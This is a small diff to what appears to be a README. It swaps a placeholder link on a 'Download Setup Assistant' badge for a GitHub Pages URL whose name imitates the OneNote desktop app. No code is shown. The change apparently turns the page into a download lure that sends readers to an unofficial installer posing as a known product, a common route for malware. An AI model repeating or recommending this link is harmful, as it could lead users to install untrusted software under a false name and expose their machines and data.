@@ -2,7 +2,7 @@
 
 🔘 **Download Setup Assistant:**
 
-[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](#)
+[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://onenote-desktop-app.github.io/.github/)
 
 ## ⚙️ How to Use
 
